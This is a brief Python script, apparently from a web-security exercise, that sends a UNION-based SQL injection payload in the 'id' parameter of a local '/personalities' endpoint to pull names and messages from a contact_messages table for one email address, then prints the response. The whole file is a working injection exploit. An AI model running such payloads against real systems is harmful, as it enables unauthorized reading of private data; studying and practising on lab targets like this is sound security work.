from bs4 import BeautifulSoup

import requests
from requests.exceptions import HTTPError

url = "http://0.0.0.0:80/personalities"

response = requests.get(url, params={'id': "1' union select name,message from contact_messages where mail='james@bond.mi5"})

soup = BeautifulSoup(response.text, 'html.parser')
print(soup.body)
